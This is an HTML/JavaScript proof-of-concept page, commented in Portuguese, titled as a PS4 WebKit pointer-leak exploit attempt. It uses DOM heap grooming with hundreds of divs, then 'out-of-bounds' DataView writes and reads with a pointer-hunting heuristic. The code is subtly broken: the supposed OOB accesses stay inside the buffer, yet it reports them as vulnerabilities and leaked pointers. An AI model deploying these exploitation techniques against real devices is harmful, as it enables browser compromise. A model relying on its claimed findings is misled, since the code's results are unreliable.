<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit PoC - Leak Exploit Attempt v10</title>
    <style>
        /* Estilos CSS */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 12px; }
        #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        .log-info { color: #6cf; }
        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
        .log-vuln { color: #ff4444; font-weight: bold; }
        .log-leak { color: #FF9800; font-weight: bold; } /* Laranja para dados OOB não-padrão */
        .log-ptr { color: #f0f; font-weight: bold; } /* Magenta para ponteiros REAIS vazados */
        .log-good { color: #4CAF50; }
        .log-warn { color: #FFC107; }
        .log-error { color: #f44336; }
        #grooming-area { display: none; } /* Esconder divs do grooming */
    </style>
</head>
<body>
    <h1>PS4 WebKit PoC - Leak Exploit Attempt v10</h1>
    <p>Foco: Heap Grooming com DIVs + Leitura OOB para vazar ponteiros reais.</p>
    <button id="runBtn" onclick="runExploitAttempt()">Iniciar Tentativa de Leak</button>
    <div id="output"></div>
    <div id="grooming-area"></div> <script>
        const outputDiv = document.getElementById('output');
        const runBtn = document.getElementById('runBtn');
        const groomArea = document.getElementById('grooming-area');
        const SHORT_PAUSE = 50;
        const MEDIUM_PAUSE = 200;

        // --- Função de Log ---
        const log = (message, type = 'info') => { /* ... Função log ... */ if(!outputDiv)return;try{const t=`[${new Date().toLocaleTimeString()}]`;const s=String(message).replace(/</g,"&lt;").replace(/>/g,"&gt;");if(outputDiv.innerHTML.length>500000){outputDiv.innerHTML=outputDiv.innerHTML.substring(outputDiv.innerHTML.length-250000);outputDiv.innerHTML=`<span>[Log Truncado...]</span>\n`+outputDiv.innerHTML;}outputDiv.innerHTML+=`<span class="log-${type}">${t} ${s}\n</span>`;outputDiv.scrollTop=outputDiv.scrollHeight;}catch(e){console.error("Erro log:",e);outputDiv=null;}};

        // --- Heurística de Ponteiro ---
        // (Mesma heurística simples usada antes)
        const isPotentialPointer64 = (high, low) => {
            if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false;
            if (high === 0 && low === 0) return false;
            if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false;
            if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; // Ignora padrão AAAA
            if (high === 0xBBBBBBBB && low === 0xBBBBBBBB) return false; // Ignora padrão BBBB
            if (high === 0 && low < 0x100000) return false; // Ignora valores pequenos
            // if (low % 8 !== 0) return false; // Alinhamento opcional
            return true;
        };
        const toHex = (val, bits = 32) => { /* ... Função toHex ... */ if(typeof val!=='number'||!isFinite(val))return'NaN/Invalid';let n=Number(val);if(bits<=32){n=n>>>0;}const p=Math.ceil(bits/4);return'0x'+n.toString(16).toUpperCase().padStart(p,'0');};

        // --- Teste Principal (Heap Grooming + Leitura OOB Focada) ---
        const runLeakExploitAttempt_v10 = async () => {
            log("--- Iniciando Teste Principal: Heap Grooming + Leitura OOB Focada v10 ---", 'test');
            log("ALTO RISCO DE CRASH!", 'warn');

            const bufferSizeForLeakTest = 32; // Tamanho do buffer no teste que vazou o padrão AAAA
            const oobWriteOffset = 32; // Offset OOB relativo onde a escrita funcionou
            const writeValue = 0xEE; // Valor escrito naquele teste
            // Offsets OOB relativos onde o padrão AAAA... apareceu (ajustado para ser relativo ao baseOffset)
            const oobReadOffsets = [-32, -24, -16, -8, 40, 48, 56, 64]; // +40, +48, +56, +64 relativos ao baseOffset+bufferSizeForLeakTest=baseOffset+32

            const groomTargetCount = 500; // Mais DIVs
            const groomDivs = []; // Array para manter referência aos DIVs
            let potentialLeakFound = false;
            let leakedPointers = []; // Array para armazenar ponteiros vazados

            try {
                // 1. HEAP GROOMING com DIVs
                log(`[Grooming] Alocando e adicionando ${groomTargetCount} DIVs ao DOM...`, 'info');
                groomArea.innerHTML = ''; // Limpar área antes
                for(let i = 0; i < groomTargetCount; i++) {
                    try {
                        const div = document.createElement('div');
                        div.id = `groom_div_${i}`;
                        div.textContent = `Groom ${i} ` + "ABC".repeat(100); // Conteúdo
                        div.style.border='1px solid #333'; // Estilo mínimo para forçar objeto de layout
                        groomArea.appendChild(div);
                        groomDivs.push(div); // Guardar referência
                    } catch (e) { log(`Erro alocando/adicionando DIV ${i}: ${e.message}`, 'error'); }
                }
                 log(`[Grooming] ${groomDivs.length} DIVs adicionados. Aguardando...`, 'info');
                 await new Promise(r => setTimeout(r, MEDIUM_PAUSE)); // Pausa maior

                // 2. Alocar Buffer de Ataque (buffer grande o suficiente para escrita e leitura OOB)
                const readBufferSize = 256; // Tamanho do buffer onde faremos R/W
                const baseOffsetInDataView = 128; // Ponto de referência dentro do buffer
                log(`[Alocação] Alocando buffer R/W (tamanho ${readBufferSize})...`, 'info');
                const buffer = new ArrayBuffer(readBufferSize);
                const dataView = new DataView(buffer);
                // Preencher com padrão BB para diferenciar
                for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xBB); }
                log(`[Alocação] Buffer R/W preenchido com 0xBB.`, 'info');


                // 3. OOB Write (no offset que funcionou antes, relativo ao baseOffset)
                const writeTargetAddress = baseOffsetInDataView + oobWriteOffset;
                 log(`[OOB Write] Tentando escrita U8 @${oobWriteOffset} (addr ${writeTargetAddress}) com valor ${toHex(writeValue, 8)}...`, 'subtest');
                 try {
                     dataView.setUint8(writeTargetAddress, writeValue);
                     log(`[OOB Write] VULN: Escrita OOB U8 @${oobWriteOffset} permitida!`, 'vuln');
                 } catch (e) {
                     log(`[OOB Write] BLOQUEADO: Escrita OOB U8 @${oobWriteOffset} impedida: ${e.message}`, 'error');
                     log("--- Teste Interrompido (Escrita OOB falhou) ---", 'test');
                     return; // Não continuar se a escrita OOB necessária falhar
                 }
                 await new Promise(r => setTimeout(r, SHORT_PAUSE));

                 // 4. OOB Read Focada nos Offsets de Interesse (onde AAAA... apareceu)
                 log(`[OOB Read] Lendo U64 nos offsets de interesse (relativos ao baseOffset): [${oobReadOffsets.join(', ')}]`, 'subtest');

                 for (const readOffset of oobReadOffsets) {
                     const readTargetAddress = baseOffsetInDataView + readOffset;
                      // Garantir leitura dentro do buffer alocado
                     if (readTargetAddress < 0 || readTargetAddress + 8 > buffer.byteLength) {
                          // log(`  Offset ${readOffset} (addr ${readTargetAddress}) fora do buffer de teste.`, 'info');
                          continue;
                     }

                     // log(`  Lendo U64 @${readOffset} (addr ${readTargetAddress})...`, 'info');
                     await new Promise(r => setTimeout(r, SHORT_PAUSE / 10)); // Pausa mínima
                     try {
                         const low = dataView.getUint32(readTargetAddress, true);
                         const high = dataView.getUint32(readTargetAddress + 4, true);
                         const valueStr = `H=${toHex(high)} L=${toHex(low)}`;
                         const maybeAAAA = (high === 0xAAAAAAAA && low === 0xAAAAAAAA);
                         const maybeBBBB = (high === 0xBBBBBBBB && low === 0xBBBBBBBB);

                         if ((low !== 0 || high !== 0) && !maybeAAAA && !maybeBBBB) { // Ignorar 0 e padrões
                            if (isPotentialPointer64(high, low)) { // Aplicar heurística
                                 log(`  >> POTENCIAL PONTEIRO ENCONTRADO! @${readOffset}: ${valueStr}`, 'ptr');
                                 potentialLeakFound = true;
                                 leakedPointers.push({offset: readOffset, high: high, low: low});
                             } else {
                                 log(`  >> Dado OOB Não Padrão @${readOffset}: ${valueStr}`, 'leak');
                             }
                         } else if (maybeAAAA) {
                              log(`  Dado OOB @${readOffset}: ${valueStr} (Padrão AAAA...)`, 'info'); // Logar AAAA para referência
                         }

                     } catch (e) {
                         log(`  Leitura OOB U64 @${readOffset} (addr ${readTargetAddress}): FALHA (${e.message})`, 'warn');
                     }
                 } // Fim loop leitura OOB

            } catch (e) { log(`Erro inesperado durante o teste: ${e.message} ${e.stack}`, 'error'); }
            finally {
                // Limpar DIVs do grooming
                log("[Limpeza] Removendo DIVs do grooming...", 'info');
                 try { groomArea.innerHTML = ''; } catch(e){} // Limpar área
                 groomDivs.length = 0; // Limpar array de referência
                 log("[Limpeza] Concluída.", 'info');
            }

            // Log Final
            if (potentialLeakFound) {
                 log(`>>> SUCESSO! Potenciais ponteiros REAIS vazados! <<<`, 'vuln');
                 log("Ponteiros Vazados (offset relativo ao baseOffset, High, Low):", 'ptr');
                 leakedPointers.forEach(p => log(`  @${p.offset}: ${toHex(p.high)} ${toHex(p.low)}`, 'ptr'));
            } else {
                 log(`--- FALHA: Nenhum ponteiro real promissor encontrado nos offsets de interesse após grooming. ---`, 'warn');
            }
            log("--- Teste Principal Concluído ---", 'test');
            if (runBtn) runBtn.disabled = false;
        };

        // --- Função Principal ---
        // Simplificado para rodar apenas o teste principal
        const runExploitAttempt = async () => { // Renomeada para clareza
             if (runBtn) runBtn.disabled = true;
             log("==== INICIANDO TESTE v10 (Leak Exploit Attempt) ====", 'critical');
             // Adicionar displayUserAgent se necessário
             const displayUserAgent = () => { const ua=navigator.userAgent||"N/A"; log(`User Agent: ${ua}`,'info'); /* Adicionar parsing se quiser */};
             displayUserAgent();
             await runLeakExploitAttempt_v10();
             log("\n==== TESTE v10 CONCLUÍDO ====", 'critical');
             if (runBtn) runBtn.disabled = false;
        };

        // Executar ao carregar? Não, esperar botão.
        // document.addEventListener('DOMContentLoaded', runExploitAttempt);

    </script>

</body>
</html>
